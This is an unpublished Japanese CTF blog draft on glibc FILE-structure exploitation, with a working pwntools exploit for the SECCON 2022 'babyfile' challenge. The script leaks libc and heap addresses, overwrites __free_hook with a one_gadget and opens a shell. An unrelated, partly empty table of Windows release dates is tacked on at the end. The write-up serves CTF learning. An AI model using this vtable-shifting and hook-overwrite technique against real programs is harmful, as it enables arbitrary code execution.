---
title: "【CTF 探訪記】File Structure Oriented Programming"
emoji: "📘"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["CTF", "pwn"]
published: false
---

pwn というのはメモリの書き換えや読み取りなどの低レイヤーの脆弱性を用いて意図しない動作を引き起こさせる競技で最もハッキングっぽい分野です。

- [Stack Exploits](https://zenn.dev/anko/articles/ctf-stack-exploits)
- [Heap Exploits](https://zenn.dev/anko/articles/ctf-heap-exploits)

今回は

### _IO_FILE 構造体の書き換え

```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

```

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

- [ヒープ系問題におけるstdout / stderrを利用したメモリリーク - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444)
# babyfile upsolve

https://github.com/SECCON/SECCON2022_online_CTF

source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
        FILE *fp;

        alarm(60);

        write_str("Play with FILE structure\n");

        if(!(fp = fopen("/dev/null", "r"))){
                write_str("Open error");
                return -1;
        }
        fp->_wide_data = NULL;

        for(;;){
                switch(menu()){
                        case 0:
                                goto END;
                        case 1:
                                fflush(fp);
                                break;
                        case 2:
                                {
                                        unsigned char ofs;
                                        write_str("offset: ");
                                        if((ofs = getint()) & 0x80)
                                                ofs |= 0x40;
                                        write_str("value: ");
                                        ((char*)fp)[ofs] = getint();
                                }
                                break;
                }
                write_str("Done.\n");
        }

END:
        write_str("Bye!");
        _exit(0);
}

static int menu(void){
        write_str("\nMENU\n"
                        "1. Flush\n"
                        "2. Trick\n"
                        "0. Exit\n"
                        "> ");

        return getint();
}

static int getnline(char *buf, int size){
        int len;

        if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
                return -1;

        if(buf[len-1]=='\n')
                len--;
        buf[len] = '\0';

        return len;
}

static int getint(void){
        char buf[0x10] = {};

        getnline(buf, sizeof(buf));
        return atoi(buf);
}
```

/dev/null を開いたFILE構造体に好き放題書き込める
fflushできるときどうやってshellにつなげるか

### leak

vtableを直接改ざんするのは無理(アドレスが特定セクションの範囲内にあるかチェックするので)
vtableをずらすことはできる

とりあえずheap領域のbufferを `_IO_write_*`に設定できた

glibc-2.31のコードを読むと
 `_IO_new_file_sync -> _IO_do_flush -> _IO_do_write -> ... -> new_do_write`
 みたいな流れがある `_IO_do_flush`ではwrite_baseからwrite_ptrの位置まで出力を吐き出す
 そのためfilenoをSTDOUT_fileno(=1)に設定してwrite_baseを適当に巻き戻すと出力される。
 (このときnew_do_writeの分岐のためにread_endもwrite_baseと同じ値にしておく必要がある)
 1/16なので若干だるい

 leak完了

### control PC

IO_new_file_flushでvtableの_IO_new_file_syncを呼び出すと
引数は`(FILE *,int?,heap addr)`になる vtable関数の中からこの引数でAAW or get PCできるものを探すしかない

引数的にありえそうな候補
- `_IO_finish_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_pbackfail_t(FILE *)`
- `_IO_seekoff_t(FILE *,off64_t,int)`
- `_IO_seekpos_t(FILE *,off64_t,int)`

### toketa
```python
from pwn import *

#context.terminal = ['tmux','splitw','-h']
context.terminal = ['open_tab.sh']

read_ptr = 0x8
read_end = 0x10
read_base = 0x18
write_base = 0x20
write_ptr = 0x28
write_end = 0x30

while True:
    io = process('./chall')

    def fflush():
        io.sendlineafter(b'> ',b'1')

    def overwrite(off,val):
        io.sendlineafter(b'> ',b'2')
        io.sendlineafter(b'offset: ',str(off).encode())
        io.sendlineafter(b'value: ',str(val).encode())

    def overwrite_word(off,val):
        for i in range(8):
            overwrite(off+i,val & 0xff)
            val >>= 8

    fflush()
    fflush()

    overwrite(0xd8,0xa8)
    fflush()

    log.info("called _IO_file_doallocate")

    overwrite(0xd8,0x60)
    fflush()

    log.info("called _IO_file_underflow")

    overwrite(0xd8,0xa0)
    overwrite(0x70,0x1)
    overwrite(0x20,0x90)
    overwrite(0x21,0x12)
    overwrite(0x10,0x90)
    overwrite(0x11,0x12)

    log.info("overwrite read_end,write_base")

    fflush()

    log.info("leak by _IO_new_file_sync")

    buf = io.recv(0x80)
    if len(buf) != 0x80:
        io.close()
        continue

    libc_base = u64(buf[0x78:0x80]) + 0x7f13af008000 - 0x7f13af1f55c0
    heap_base = u64(buf[0x18:0x20]) + 0x564653a51000 - 0x564653a5350f
    log.info(f'libc_base = {hex(libc_base)}')
    log.info(f'heap_base = {hex(heap_base)}')

    gdb.attach(io,'''
            b *main+121
            c
            set $foo = *((long *)$rsp + 1)
    ''')

    input()

    def AAW(addr,val):
        overwrite_word(0xd8,libc_base + 0x7f30d22140e0 - 0x7f30d202b000)
        overwrite_word(0xf0,addr)
        overwrite_word(0xf8,addr)
        overwrite_word(write_base,0)
        overwrite_word(write_ptr,val)
        fflush()

    free_hook = libc_base + 0x7f6822dbde48 - 0x7f6822bcf000
    one_gadget = libc_base + 0xe3b01

    AAW(free_hook,one_gadget)

    log.info('overwrite free_hook')

    IO_file_jumps = libc_base + 0x7fba711e64a0 - 0x7fba70ffd000

    overwrite_word(0xd8,IO_file_jumps - 0x50)
    overwrite_word(0x70,0xffffffffffffffff)

    log.info('prepared finish->free')

    fflush()

    io.interactive()

    break
```

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

Windows OS の歴史

| バージョン | 発売日 | 説明 |
| --- | --- | --- |
| Windows 1.x | 1985/11/20 |
| Windows 2.x | 1987/12/9 |
| Windows 3.x | 1990/5/22 |
| Windows NT | 1993/7/27 | Graphics Device (GDI) |
| Windows 95 | 1995/8/24 |
| Windows 98 | 1998/6/25 |
| Windows 2000 | 1999/12/15 | 9x系 NT系の脆弱性は深刻な社会問題 |
| Windows XP | 2001/8/24 | Service Pack2 (SP2) はセキュリティ改良 |
| Windows Vista | 2006/11/30 | |
| Windows 7 | 2009/9/1 |
| Windows 8 | 2012/8/16 |
| Windows 10 | 2015/7/29 | EMET サポート終了 Exploit Protection 開始 |
| Windows 11 | 2021/10/5 |

Service Pack
